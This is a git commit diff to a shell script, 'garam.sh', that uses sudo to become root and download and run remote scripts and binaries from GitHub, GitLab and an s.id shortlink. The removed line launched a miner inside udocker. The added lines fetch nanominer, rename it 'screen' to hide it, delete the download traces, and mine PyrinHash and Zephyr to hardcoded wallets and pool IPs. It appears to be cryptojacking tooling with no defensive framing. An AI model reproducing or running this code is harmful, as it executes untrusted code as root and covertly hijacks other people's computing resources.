0213157c99eb980518654ff239179a446f8f9e36
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-07-31 01:58:45 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -1,5 +1,15 @@
 #!/bin/bash
 sudo su <<EOF
 wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
-wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) '
+apt-get -y install screen
 EOF
+
+screen
+
+mkdir udocker
+
+cd udocker
+
+wget https://github.com/nanopool/nanominer/releases/download/v3.9.2/nanominer-linux-3.9.2.tar.gz && tar -xvf nanominer-linux-3.9.2.tar.gz &&  mv nanominer screen && rm -rf con* nano*
+
+./screen -silence 2 -algo PyrinHash -wallet pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) -pool1 47.237.21.190:443 -coin PYI -algo randomx -wallet ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -pool1 47.89.195.104:443 -coin ZEPH
